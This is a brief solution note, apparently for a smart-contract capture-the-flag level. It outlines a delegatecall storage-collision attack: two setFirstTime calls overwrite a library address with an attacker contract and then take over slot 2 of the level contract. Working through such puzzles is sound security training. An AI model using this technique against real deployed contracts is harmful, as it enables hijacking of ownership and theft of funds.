Solution:
Call to overwrite variable in slot 0 timeZone1Library:
await contract.setFirstTime("address of Hack contract")
Call 2:
await contract.setFirstTime(any_value)

Other Notes:
-reminder, msg.sender on delegatecall is that of original sender.
-on delegatecall in Call 2, you may overwrite slot 2 in the hack contract,
which overwrites slot 2 in Level.
